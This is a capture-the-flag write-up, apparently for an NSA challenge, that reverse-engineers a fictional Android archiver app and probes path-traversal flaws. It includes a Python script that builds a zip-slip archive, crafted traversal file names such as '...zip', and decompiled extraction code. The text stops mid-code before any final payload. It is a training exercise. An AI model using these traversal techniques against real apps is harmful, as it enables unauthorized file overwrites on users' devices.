# Task 7 - Finale - (Vulnerability Research, Exploitation)

Now that we have access to the hidden channel the adversary is using, our military counterparts want to act quickly to destroy the adversary's capacity to continue with their attack against our military networks.

Analysts have been quickly scrutinizing the data from the privileged channel. They conclude that the adversary has downloaded a custom app to archive all messages sent in the channel locally to their phone. They have also surmised the adversary is running a recent version of Android on a Google Pixel phone. This is the opportunity we have been waiting for! If we can devise a way to exploit on to the adversary's device we will have the advantage.

Another team has retrieved the custom application APK file for you to analyze.


## Downloads

  - [Custom App (mmarchiver.apk)](Downloads/mmarchiver.apk)
  - [Licenses (licenses.txt)](Downloads/licenses.txt)

## Prompt

    Submit a file to be posted to the Mattermost Channel that will be processed by the app and exploits the device. Be careful, we might only be able to do this once!

## Solution

---

Given a custom Android app, the first thing we should do is take a look at the [manifest](https://developer.android.com/guide/topics/manifest/manifest-intro), `AndroidManifest.xml`. An [APK](https://en.wikipedia.org/wiki/Apk_(file_format)) file is just a ZIP archive, however simply unzipping will not yield readable files. We can use [Apktool](https://apktool.org/) to open the archive with readable files by using `java -jar .\apktool_2.12.1.jar decode -o mmarchiver.out .\mmarchiver.apk`

The first line of `AndriodManifest.xml` tells us the information we need to know to proceed:
```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="36" android:compileSdkVersionCodename="16" package="com.badguy.mmarchiver" platformBuildVersionCode="36" platformBuildVersionName="16">
```

Adding information beyond `a recent version of Android on a Google Pixel phone`, we can see that the app is compiled to target [Android 16](https://dragonball.fandom.com/wiki/Android_16) aka [SDK 36 (Baklava)](https://apilevels.com/). Armed with this information, let's install [Android Studio](https://developer.android.com/studio) and set up a Google Pixel emulator.

After installing Android Studio, click the `More Actions` button and select `SDK Manager`:

![Android Studio more actions button](more_actions.png)

Make sure that API level 36.0 is selected both on both the `SDK Platforms` and `SDK Tools` tabs and click `Apply` to download them if not present. These will be used later for compilation.

| SDK Platforms | SDK Tools |
|:-------------:|:---------:|
| ![SDK Platforms tab](sdk_platforms.png) | ![SDK Tools tab](sdk_tools.png) |

Next, go back to select `More Actions` again and open `Virtual Device Manager`. Click the plus symbol to `Create Virtual Device`. Search for "pixel" and select `Pixel 9 Pro XL` to get the latest flagship model with a large screen for viewing and click `Next`. On the `Configure virtual device` screen, make sure that the API is `API 36.0 "Baklava"; Android 16.0` and select `Android Open Source` for `Services`. This is very important, as using [Android Open Source Project (AOSP)](https://source.android.com/) will allow root access to the emulator! Click `Finish` to create the device and then click the play button to `Start` the device.

![Pixel 9 Pro XL virtual device configuration](emulator_config.png)

If all has gone well, you should have a Google Pixel 9 Pro XL emulator running ready to install the app on. Do so by dragging and dropping `mmarchiver.apk` onto the screen. Click on the app to launch and fill in the `Mattermost Server URL` as http://10.0.2.2:8065 (make sure the local Mattermost instance from task 6 is still running). Click `Start` and use the username and password from task 6 then click `OK`. 

| App Settings | App Running |
|:---:|:----:|
| ![mmarchiver app settings](mmarchiver.png) | ![mmarchiver app running](running.png)

To test the app and connection to Mattermost, upload the [test.txt](test.txt) file to Mattermost, open the mmarchiver app and press `Stop` and then `Start` again. This will trigger the app to immediately check the server. There should be a notification that the file download and the file can be found in the `Files` app under path `sdk_gphone64_x86_64/Android/data/com.badguy.mmarchiver/files`

| Mattermost Upload | App Running | test.txt Archived in Files |
|:---:|:----:|:----:|
![Mattermost test.txt upload](mm_upload.png) | ![App notification](app_notification.png) | ![Archived file](archived_file.png)

Now that we have the app functioning, we can take a look at what is happening under the hood. Either `adb.exe` is in your shell path or you can call it from the installation directory `%localAppData%\Android\Sdk\platform-tools`. Open a shell and execute `.\adb.exe root` to gain root privledges for exploring the filesystem and then run `.\adb.exe shell` to explore. Run `cd /data/data/com.badguy.mmarchiver/` to enter the app's directory which consists of the following folders and files:
``` sh
drwx------   7 u0_a217 u0_a217        4096 2026-01-01 21:16 .
drwxrwx--x 188 system  system        16384 2026-01-02 17:55 ..
drwxrws--x   6 u0_a217 u0_a217_cache  4096 2026-01-01 21:40 cache
drwxrws--x   2 u0_a217 u0_a217_cache  4096 2026-01-01 21:16 code_cache
drwxrwx--x   2 u0_a217 u0_a217        4096 2026-01-01 21:26 databases
drwxrwx--x   3 u0_a217 u0_a217        4096 2026-01-04 17:52 files
drwxrwx--x   2 u0_a217 u0_a217        4096 2026-01-01 21:16 no_backup

com.badguy.mmarchiver/cache:
total 52
drwxrws--x 6 u0_a217 u0_a217_cache 4096 2026-01-01 21:40 .
drwx------ 7 u0_a217 u0_a217       4096 2026-01-01 21:16 ..
-rw------- 1 u0_a217 u0_a217_cache    0 2026-01-09 21:31 archive_database.lck
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 data
drwx--S--- 2 u0_a217 u0_a217_cache 4096 2026-01-07 20:08 download
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 oat_primary
drwx--S--- 4 u0_a217 u0_a217_cache 4096 2026-01-14 23:30 zippier

com.badguy.mmarchiver/cache/data:
total 24
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 .
drwxrws--x 6 u0_a217 u0_a217_cache 4096 2026-01-01 21:40 ..
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 user

com.badguy.mmarchiver/cache/data/user:
total 24
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 .
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 ..
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 0

com.badguy.mmarchiver/cache/data/user/0:
total 24
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 .
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 ..
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 com.badguy.mmarchiver

com.badguy.mmarchiver/cache/data/user/0/com.badguy.mmarchiver:
total 24
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 .
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 ..
drwx--S--- 2 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 no_backup

com.badguy.mmarchiver/cache/data/user/0/com.badguy.mmarchiver/no_backup:
total 20
drwx--S--- 2 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 .
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 ..
-rw------- 1 u0_a217 u0_a217_cache    0 2026-01-09 21:17 androidx.work.workdb.lck

com.badguy.mmarchiver/cache/download:
-rw------- 1 u0_a217 u0_a217_cache       4 2026-01-14 23:14 test.txt


com.badguy.mmarchiver/cache/oat_primary:
total 24
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 .
drwxrws--x 6 u0_a217 u0_a217_cache 4096 2026-01-01 21:40 ..
drwx--S--- 2 u0_a217 u0_a217_cache 4096 2026-01-02 17:56 x86_64

com.badguy.mmarchiver/cache/oat_primary/x86_64:
total 636
drwx--S--- 2 u0_a217 u0_a217_cache   4096 2026-01-02 17:56 .
drwx--S--- 3 u0_a217 u0_a217_cache   4096 2026-01-01 21:16 ..
-rw------- 1 u0_a217 u0_a217_cache 639664 2026-01-02 17:56 base.art

com.badguy.mmarchiver/cache/zippier:
total 40
drwx--S--- 4 u0_a217 u0_a217_cache 4096 2026-01-14 23:30 .
drwxrws--x 6 u0_a217 u0_a217_cache 4096 2026-01-01 21:40 ..
drwxrwsrwx 2 root    u0_a217_cache 4096 2026-01-14 23:30 extract
drwxrwsrwx 3 root    u0_a217_cache 4096 2026-01-10 11:41 formats

com.badguy.mmarchiver/cache/zippier/extract:
total 16
drwxrwsrwx 2 root    u0_a217_cache 4096 2026-01-14 23:30 .
drwx--S--- 4 u0_a217 u0_a217_cache 4096 2026-01-14 23:30 ..

com.badguy.mmarchiver/cache/zippier/formats:
total 32
drwxrwsrwx 3 root    u0_a217_cache 4096 2026-01-10 11:41 .
drwx--S--- 4 u0_a217 u0_a217_cache 4096 2026-01-14 23:30 ..
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-10 11:41 oat

com.badguy.mmarchiver/cache/zippier/formats/oat:
total 28
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-10 11:41 .
drwxrwsrwx 3 root    u0_a217_cache 4096 2026-01-10 11:41 ..
drwx--S--- 2 u0_a217 u0_a217_cache 4096 2026-01-10 11:41 x86_64

com.badguy.mmarchiver/cache/zippier/formats/oat/x86_64:
total 24
drwx--S--- 2 u0_a217 u0_a217_cache 4096 2026-01-10 11:41 .
drwx--S--- 3 u0_a217 u0_a217_cache 4096 2026-01-10 11:41 ..

com.badguy.mmarchiver/code_cache:
total 16
drwxrws--x 2 u0_a217 u0_a217_cache 4096 2026-01-01 21:16 .
drwx------ 7 u0_a217 u0_a217       4096 2026-01-01 21:16 ..

com.badguy.mmarchiver/databases:
total 516
drwxrwx--x 2 u0_a217 u0_a217   4096 2026-01-01 21:26 .
drwx------ 7 u0_a217 u0_a217   4096 2026-01-01 21:16 ..
-rw-rw---- 1 u0_a217 u0_a217  45056 2026-01-10 11:41 archive_database
-rw------- 1 u0_a217 u0_a217  32768 2026-01-14 23:14 archive_database-shm
-rw------- 1 u0_a217 u0_a217 416152 2026-01-14 23:14 archive_database-wal

com.badguy.mmarchiver/files:
total 36
drwxrwx--x 3 u0_a217 u0_a217 4096 2026-01-04 17:52 .
drwx------ 7 u0_a217 u0_a217 4096 2026-01-01 21:16 ..
drwx------ 2 u0_a217 u0_a217 4096 2026-01-14 23:14 datastore
-rw------- 1 u0_a217 u0_a217    0 2026-01-04 17:52 profileInstalled
-rw------- 1 u0_a217 u0_a217    8 2026-01-01 21:16 profileinstaller_profileWrittenFor_lastUpdateTime.dat

com.badguy.mmarchiver/files/datastore:
total 24
drwx------ 2 u0_a217 u0_a217 4096 2026-01-14 23:14 .
drwxrwx--x 3 u0_a217 u0_a217 4096 2026-01-04 17:52 ..
-rw------- 1 u0_a217 u0_a217  168 2026-01-14 23:14 mm_archiver.preferences_pb

com.badguy.mmarchiver/no_backup:
total 676
drwxrwx--x 2 u0_a217 u0_a217   4096 2026-01-01 21:16 .
drwx------ 7 u0_a217 u0_a217   4096 2026-01-01 21:16 ..
-rw-rw---- 1 u0_a217 u0_a217 106496 2026-01-14 23:14 androidx.work.workdb
-rw------- 1 u0_a217 u0_a217  32768 2026-01-14 23:14 androidx.work.workdb-shm
-rw------- 1 u0_a217 u0_a217 523272 2026-01-14 23:14 androidx.work.workdb-wal
```
In a [Git Bash](https://gitforwindows.org/) shell, run `./adb logcat` to see the emulator logs updating live. Stop and start the app again to find the PID and then run `./adb logcat | grep "PID"` to only see the app logs (note: this will hide some of the PIDs that spawn from the app). We can see that the important part of the logs for our `test.txt` upload are as follows:
```sh
01-14 23:14:33.182  2453 15549 D FileDownloadWorker: downloading file id=tr9iqijoppbp8p6zo5qs9sx1gw name=test.txt
01-14 23:14:33.182  2453 15736 D MmAuthInterceptor: adding token to request: 9q66omgz8tydpej1s863z4938y
01-14 23:14:33.199  2453 15735 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/test.txt
01-14 23:14:33.199  2453 15735 D d       : [DefaultDispatcher-worker-5] getting format for txt
01-14 23:14:33.199  2453 15735 D b       : [DefaultDispatcher-worker-5] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/test.txt-1768450473199.tar.xz
01-14 23:14:33.201  2453 15735 D b       : [DefaultDispatcher-worker-5] adding entry b[test] to archive file
01-14 23:14:33.207  2453 15735 I FileDownloadWorker: archived file test.txt successfully
01-14 23:14:33.215  2453 15735 I FileDownloadWorker: file download failed, requeueing (error=GET_FILE_FAILED)
01-14 23:14:33.215  2453 15735 D PreferencesRepository: saving file_download_attempts 1
01-14 23:14:33.219  2453  2453 D MainScreenViewModel: notifications enabled: true
01-14 23:14:33.219  2453  2453 D MainScreenViewModel: token is set
01-14 23:14:33.219  2453  2453 D MainScreenViewModel: status is ArchiverStatus(running=true, error=NONE)
01-14 23:14:33.219  2453  2532 I WM-WorkerWrapper: Worker result SUCCESS for Work [ id=8e4fba35-c8a7-4b4f-bd47-0f5a8edd2c3a, tags={ com.badguy.mmarchiver.worker.FileDownloadWorker } ]
01-14 23:14:33.220  2453  2453 D WM-Processor: d 8e4fba35-c8a7-4b4f-bd47-0f5a8edd2c3a executed; reschedule = false
01-14 23:14:33.220  2453  2453 D WM-SystemJobService: 8e4fba35-c8a7-4b4f-bd47-0f5a8edd2c3a executed on JobScheduler
01-14 23:14:33.220  2453  2532 D WM-GreedyScheduler: Cancelling work ID 8e4fba35-c8a7-4b4f-bd47-0f5a8edd2c3a
01-14 23:14:33.221  2453  2453 D MainScreenViewModel: notifications enabled: true
01-14 23:14:33.221  2453  2453 D MainScreenViewModel: token is set
01-14 23:14:33.221  2453  2453 D MainScreenViewModel: status is ArchiverStatus(running=true, error=NONE)
```

---

Now that we know how to run and observe the app, we can start taking a look at the source code. We can use [jadx](https://github.com/skylot/jadx) GUI to decompile `mmarchiver.apk` into [java](https://www.java.com/en/) code. 

We search for the string, seen in the log output, `getting format` to find our way into `com/badguy.mmarchiver/worker/FileDownloadWorker` to the `FileDownloadWorker.writeFileToDisk()` function that gets called by into  `FileDownloadWorker.doFileDownload()`. We can see that this function does no checking for [path traversal](https://owasp.org/www-community/attacks/Path_Traversal) attacks e.g. `../../test.txt` before writing to disk!:
```java
    private final File writeFileToDisk(ArchiveFile archiveFile, InputStream inputStream) throws IOException {
        try {
            File file = new File(getApplicationContext().getCacheDir(), FileDownloadWorkerKt.DOWNLOAD_PATH);
            if (!file.exists()) {
                file.mkdirs();
            }
            File file2 = new File(file, archiveFile.getName());
            try {
                FileOutputStream fileOutputStream = new FileOutputStream(file2);
                try {
                    m0.c.v(inputStream, fileOutputStream);
                    fileOutputStream.close();
                    inputStream.close();
                    Log.d(this.TAG, "file written to " + file2.getPath());
                    return file2;
                } finally {
                }
            } finally {
            }
        } catch (IOException e5) {
            Log.e(this.TAG, "exception during file download: " + e5);
            this.error = ArchiverError.FILE_DOWNLOAD_FAILED;
            return null;
        }
    }
```

The question is then how to exploit this vulnerability. Especially since we would like to save the file to disk for storage and for submittal to the NSA challenge website and both Windows and Linux do not allow creating filenames with slashes in them. Let's try [URL encoding](https://www.w3schools.com/tags/ref_urlencode.ASP) to see what the app does with the file `..%2F..%2Fdatabases%2Ftest.txt` (hopefully converts it to `../../databases/test.txt` and adds it to the `databases` folder to prove we can overwrite the database.) But alas, the file is simply saved with the given name, so URL encoding is not a viable attack path.
```
01-03 21:59:36.279  4590  4590 D WM-WorkerWrapper: Starting work for com.badguy.mmarchiver.worker.FileDownloadWorker
01-03 21:59:36.287  4590 16525 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/..%2F..%2Fdatabases%2Ftest.txt
01-03 21:59:36.288  4590 16525 D b       : [DefaultDispatcher-worker-5] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/..%2F..%2Fdatabases%2Ftest.txt-1767495576287.tar.xz
01-03 21:59:36.315  4590  4610 I WM-WorkerWrapper: Worker result SUCCESS for Work [ id=95e97ba7-538d-41e0-a783-09f791bfef70, tags={ com.badguy.mmarchiver.worker.FileDownloadWorker } ]
```

We try to be clever and add a small path traversal to the filename as in `..test.txt`, but that does not work either:
```
01-15 00:45:32.338  2453 15938 D FileDownloadWorker: starting
01-15 00:45:32.338  2453 15938 D FileDownloadWorker: downloading file id=hca8emnqqjguzpbp4zuorwaqph name=..test.txt
01-15 00:45:32.340  2453 16368 D MmAuthInterceptor: adding token to request: 9q66omgz8tydpej1s863z4938y
01-15 00:45:32.347  2453 16367 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/..test.txt
01-15 00:45:32.348  2453 16367 D d       : [DefaultDispatcher-worker-5] getting format for txt
01-15 00:45:32.348  2453 16367 D b       : [DefaultDispatcher-worker-5] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/..test.txt-1768455932348.tar.xz
01-15 00:45:32.348  2453 16367 D b       : [DefaultDispatcher-worker-5] adding entry b[..test] to archive file
01-15 00:45:32.368  2453 16367 I FileDownloadWorker: archived file ..test.txt successfully
```

Even `...txt` does not do the trick:
```
01-15 00:48:04.669  2453 16299 D FileDownloadWorker: starting
01-15 00:48:04.671  2453 16299 D FileDownloadWorker: downloading file id=mg1pheq1birbbjcu1f84zdxp3w name=...txt
01-15 00:48:04.679  2453 16385 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/...txt
01-15 00:48:04.680  2453 16385 D d       : [DefaultDispatcher-worker-5] getting format for txt
01-15 00:48:04.680  2453 16385 D b       : [DefaultDispatcher-worker-5] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/...txt-1768456084679.tar.xz
01-15 00:48:04.680  2453 16385 D b       : [DefaultDispatcher-worker-5] adding entry b[..] to archive file
01-15 00:48:04.687  2453 16385 I FileDownloadWorker: archived file ...txt successfully
01-15 00:48:04.690  2453  2514 I WM-WorkerWrapper: Worker result SUCCESS for Work [ id=58fc3bf5-d1ea-4943-abeb-338b59464493, tags={ com.badguy.mmarchiver.worker.FileDownloadWorker } ]
```

Let's attempt to wrap up the path traversal file in a zip, in a [zipslip](https://developer.android.com/privacy-and-security/risks/zip-path-traversal) attack, that way we can add all the slashes we want. We use Python to write the file `../../databases/test.txt` into `test.zip`:
```python
import zipfile

output_arcname = "test.zip"

with zipfile.ZipFile(output_arcname, 'w') as zipf:
    zipf.writestr('../../databases/test.txt', 'Test')

# Read and display the archive structure
print("Archive structure:")
print("-" * 40)
with zipfile.ZipFile(output_arcname, 'r') as zipf:
    for file_info in zipf.filelist:
        print(f"{file_info.filename:50} {file_info.file_size:>10} bytes")
```

Now, we are getting some different log output! But, still a failure....
```
01-15 00:56:37.489  2453 16367 D FileDownloadWorker: starting
01-15 00:56:37.490  2453 16367 D FileDownloadWorker: downloading file id=bcxmaet1nibdxq3sjwe7j6gg1a name=test.zip
01-15 00:56:37.497  2453 16385 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/test.zip
01-15 00:56:37.497  2453 16385 D d       : [DefaultDispatcher-worker-3] getting format for zip
01-15 00:56:37.498  2453 16385 D b       : [DefaultDispatcher-worker-3] found format for zip
01-15 00:56:37.498  2453 16385 D a       : [DefaultDispatcher-worker-3] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/test.zip
01-15 00:56:37.499  2453 16385 E FileDownloadWorker: failed to create archive file: java.util.zip.ZipException: Invalid zip entry path: ../../databases/test.txt
01-15 00:56:37.500  2453 16385 I FileDownloadWorker: file download failed, requeueing (error=FILE_ARCHIVE_FAILED)
```

Let's test what zip file without a zipslip attack does. (We have to delete the file from Mattermost that cause a failed download first). And, we see that something different happens! The app sees a zip file, unzips it, and then recreates the zip archive for storage:
```
01-15 01:06:04.863  2453 16367 D FileDownloadWorker: downloading file id=1e86a7xqefyfxyfrak53nnqfew name=test.zip
01-15 01:06:04.869  2453 15549 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/test.zip
01-15 01:06:04.869  2453 15549 D d       : [DefaultDispatcher-worker-4] getting format for zip
01-15 01:06:04.869  2453 15549 D b       : [DefaultDispatcher-worker-4] found format for zip
01-15 01:06:04.869  2453 15549 D a       : [DefaultDispatcher-worker-4] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/test.zip
01-15 01:06:04.870  2453 15549 D a       : [DefaultDispatcher-worker-4] processing zip entry test.txt
01-15 01:06:04.870  2453 15549 D d       : [DefaultDispatcher-worker-4] getting format for txt
01-15 01:06:04.870  2453 15549 D b       : [DefaultDispatcher-worker-4] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/test.zip-1768457164869.tar.xz
01-15 01:06:04.871  2453 15549 D b       : [DefaultDispatcher-worker-4] adding entry b[test/] to archive file
01-15 01:06:04.884  2453 15549 D b       : [DefaultDispatcher-worker-4] adding entry b[test/test.txt] to archive file
01-15 01:06:04.888  2453 15549 D b       : [DefaultDispatcher-worker-4] deleting extraction directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/test
01-15 01:06:04.889  2453 15549 I FileDownloadWorker: archived file test.zip successfully
01-15 01:06:04.906  2453  2538 I WM-WorkerWrapper: Worker result SUCCESS for Work [ id=b4600300-74ab-40d8-ae0b-b5961b08e60c, tags={ com.badguy.mmarchiver.worker.FileDownloadWorker } ]
```

Let's try to see why our zipslip attack failed. It looks like the difference between the two logs is after the string `processing zip archive`, so we search for that and find `a.uncompress()` is being called:
```java
public final class a implements ZipFormat {

    /* renamed from: a, reason: collision with root package name */
    public final Logger f4228a = LoggerFactory.getLogger(E.a(a.class).d());

    /* JADX DEBUG: Don't trust debug lines info. Lines numbers was adjusted: min line is 1 */
    @Override // net.axolotl.zippier.ZipFormat
    public final String getExtension() {
        return "zip";
    }

    /* JADX DEBUG: Another duplicated slice has different insns count: {[]}, finally: {[THROW, INVOKE, MOVE_EXCEPTION, THROW, MOVE_EXCEPTION] complete} */
    /* JADX DEBUG: Don't trust debug lines info. Lines numbers was adjusted: min line is 1 */
    /* JADX DEBUG: Finally have unexpected throw blocks count: 2, expect 1 */
    @Override // net.axolotl.zippier.ZipFormat
    public final void uncompress(File inFile, File targetPath, ZipFile outFile) throws IOException {
        r.e(inFile, "inFile");
        r.e(targetPath, "targetPath");
        r.e(outFile, "outFile");
        String str = "processing zip archive " + inFile.getAbsolutePath();
        Logger logger = this.f4228a;
        logger.debug(str);
        if (!targetPath.isDirectory() && !targetPath.mkdirs()) {
            throw new ZipException("failed to create target directory " + targetPath);
        }
        ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(inFile));
        for (ZipEntry nextEntry = zipInputStream.getNextEntry(); nextEntry != null; nextEntry = zipInputStream.getNextEntry()) {
            logger.debug("processing zip entry {}", nextEntry);
            File file = new File(targetPath, nextEntry.getName());
            String canonicalPath = file.getCanonicalPath();
            r.d(canonicalPath, "getCanonicalPath(...)");
            if (!t.e0(canonicalPath, targetPath.getCanonicalPath() + File.separator, false)) {
                throw new ZipException("bad file name " + file);
            }
            if (!nextEntry.isDirectory()) {
                File parentFile = file.getParentFile();
                if (parentFile != null && !parentFile.isDirectory() && !parentFile.mkdirs()) {
                    throw new IOException("failed to create directory " + parentFile);
                }
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                try {
                    m0.c.v(zipInputStream, fileOutputStream);
                    fileOutputStream.close();
                } finally {
                }
            } else if (!file.isDirectory() && !file.mkdirs()) {
                throw new ZipException("failed to create entry directory " + file);
            }
            outFile.addFile(file);
        }
    }
}
```

The line `String str = "processing zip archive " + inFile.getAbsolutePath();` is executing successfully. It gets the absolute path of the downloaded zip archive on disk. However, we are failing silently at the `getCanonicalPath()` check, because this function will not tolerate any path traversal from the files internal to the zip.
```java
            r.d(canonicalPath, "getCanonicalPath(...)");
            if (!t.e0(canonicalPath, targetPath.getCanonicalPath() + File.separator, false)) {
                throw new ZipException("bad file name " + file);
            }
```

After much more staring and testing, two important facts are discovered:
1. `getCanonicalPath()` only cares about moving back in the filesystem, not about digging deeper. So, a zipped file such as `folder/test.txt`in `test.zip`  will be stored in the temporary extraction path at `/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/test/folder/test.txt`
2. There is one very specific path traversal attack suitable only for zip files named `...zip`!

Here is a log output that shows each of the above:
```
01-15 01:37:12.127  2453 15549 D FileDownloadWorker: downloading file id=193c77x4fi8ipqjeoso8ypysaw name=...zip
01-15 01:37:12.134  2453 16367 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/...zip
01-15 01:37:12.134  2453 16367 D d       : [DefaultDispatcher-worker-1] getting format for zip
01-15 01:37:12.134  2453 16367 D b       : [DefaultDispatcher-worker-1] found format for zip
01-15 01:37:12.134  2453 16367 D a       : [DefaultDispatcher-worker-1] processing zip archive /data/user/0/com.badguy.mmarchiver/cache/download/...zip
01-15 01:37:12.135  2453 16367 D a       : [DefaultDispatcher-worker-1] processing zip entry folder/test.txt
01-15 01:37:12.135  2453 16367 D d       : [DefaultDispatcher-worker-1] getting format for txt
01-15 01:37:12.135  2453 16367 D b       : [DefaultDispatcher-worker-1] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/...zip-1768459032134.tar.xz
01-15 01:37:12.136  2453 16367 D b       : [DefaultDispatcher-worker-1] adding entry b[zippier/] to archive file
01-15 01:37:12.150  2453 16367 D b       : [DefaultDispatcher-worker-1] adding entry b[test] to archive file
01-15 01:37:12.157  2453 16367 D b       : [DefaultDispatcher-worker-1] deleting extraction directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..
01-15 01:37:12.157  2453 16367 E FileDownloadWorker: failed to create archive file: java.io.FileNotFoundException: Cannot delete file: /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..
01-15 01:37:12.159  2453 16367 I FileDownloadWorker: file download failed, requeueing (error=FILE_ARCHIVE_FAILED)
```

If we `ls` in the emulator path `/data/data/com.badguy.mmarchiver/cache/zippier`, we find that the folder `extract` has been deleted (from `...zip`) and that there is now a folder named `folder` present containing the file `test.txt` (from `folder/test.txt`).

This information alone is not enough to solve the task, but we have been staring for a long time and know some other interesting info about this app...

We have also found that the app has other file formats that trigger file download attempts, as seen in the following log for upload file `test.7z` using the [7zip](https://www.7-zip.org/) format [7z](https://www.7-zip.org/7z.html):
```
01-07 16:11:42.806  4034  4034 D WM-WorkerWrapper: Starting work for com.badguy.mmarchiver.worker.FileDownloadWorker
01-07 16:11:42.808  4034 29026 D FileDownloadWorker: starting
01-07 16:11:42.812  4034 29026 D FileDownloadWorker: downloading file id=613gguegsff87f6szthads714o name=test.7z
01-07 16:11:42.824  4034 29430 D FileDownloadWorker: file written to /data/user/0/com.badguy.mmarchiver/cache/download/test.7z
01-07 16:11:42.825  4034 29430 D d       : [DefaultDispatcher-worker-5] getting format for 7z
01-07 16:11:42.825  4034 29430 D d       : [DefaultDispatcher-worker-5] attempting download for format 7z
01-07 16:11:42.829   476 29433 I resolv  : GetAddrInfoHandler::run: {114 114 114 983154 10217 0}
01-07 16:11:42.830   476 29434 I resolv  : res_nmkquery: (QUERY, IN, AAAA)
01-07 16:11:42.830   476 29435 I resolv  : res_nmkquery: (QUERY, IN, A)
01-07 16:11:44.841   476 29434 E resolv  : send_mdns: timeout
01-07 16:11:44.841   476 29435 E resolv  : send_mdns: timeout
01-07 16:11:46.846   476 29434 E resolv  : send_mdns: timeout
01-07 16:11:46.846   476 29435 E resolv  : send_mdns: timeout
01-07 16:11:46.866   476 29434 I resolv  : res_nsend: used send_dg 33 terrno: 0
01-07 16:11:46.866   476 29434 I resolv  : doQuery: rcode=3, ancount=0, return value=33
01-07 16:11:46.867   476 29435 I resolv  : res_nsend: used send_dg 33 terrno: 0
01-07 16:11:46.867   476 29435 I resolv  : doQuery: rcode=3, ancount=0, return value=33
01-07 16:11:46.868  4034 29430 E d       : [DefaultDispatcher-worker-5] exception during format download: java.net.UnknownHostException: Unable to resolve host "dl.badguy.local": No address associated with hostname
01-07 16:11:46.868  4034 29430 D b       : [DefaultDispatcher-worker-5] creating archive at /storage/emulated/0/Android/data/com.badguy.mmarchiver/files/test.7z-1767820302825.tar.xz
01-07 16:11:46.869  4034 29430 D b       : [DefaultDispatcher-worker-5] adding entry b[test] to archive file
01-07 16:11:46.897  4034 29430 I FileDownloadWorker: archived file test.7z successfully
01-07 16:11:46.914  4034  4059 I WM-WorkerWrapper: Worker result SUCCESS for Work [ id=5f144938-5acb-4a4f-bebe-63503196855f, tags={ com.badguy.mmarchiver.worker.FileDownloadWorker } ]
```

Returning to the output of `Apktool`, we can find the file formats to lookup and the server to attempt connection with are defined in `mmarchiver.apk/assets/zippier.json`. Unfortunately, these are static assets baked into the application and not possible to update during runtime:
```json
{
  "formats": ["7z", "xz", "lzma", "bzip2", "gz", "tar"],
  "downloads": "formats",
  "url": "https://dl.badguy.local/zippier"
}
```

The `zippier.json` config file is applied in the class code for `ZipArchiver` on the line `InputStream inputStreamOpen = context.getAssets().open(ZipArchiverKt.ARCHIVER_CONFIG);` (We can find `public static final String ARCHIVER_CONFIG = "zippier.json"`):
```java
public final class ZipArchiver {
    public static final int $stable = 8;
    private File archiveDir;
    private d zipManager;

    /* JADX DEBUG: Another duplicated slice has different insns count: {[]}, finally: {[THROW, INVOKE, MOVE_EXCEPTION, THROW, MOVE_EXCEPTION] complete} */
    /* JADX DEBUG: Don't trust debug lines info. Lines numbers was adjusted: min line is 1 */
    /* JADX DEBUG: Finally have unexpected throw blocks count: 2, expect 1 */
    public ZipArchiver(Context context) throws IOException {
        JSONObject jSONObject;
        File filesDir;
        r.e(context, "context");
        try {
            InputStream inputStreamOpen = context.getAssets().open(ZipArchiverKt.ARCHIVER_CONFIG);
            r.d(inputStreamOpen, "open(...)");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStreamOpen, a.f1076a), 8192);
            try {
                StringWriter stringWriter = new StringWriter();
                char[] cArr = new char[8192];
                for (int i = bufferedReader.read(cArr); i >= 0; i = bufferedReader.read(cArr)) {
                    stringWriter.write(cArr, 0, i);
                }
                String string = stringWriter.toString();
                r.d(string, "toString(...)");
                jSONObject = new JSONObject(string);
                bufferedReader.close();
            } finally {
            }
        } catch (Exception unused) {
            jSONObject = new JSONObject();
        }
        this.zipManager = new d(context.getCacheDir().getAbsolutePath(), jSONObject, new j(8, this));
        if (!r.a(Environment.getExternalStorageState(), "mounted") || (filesDir = context.getExternalFilesDir(null)) == null) {
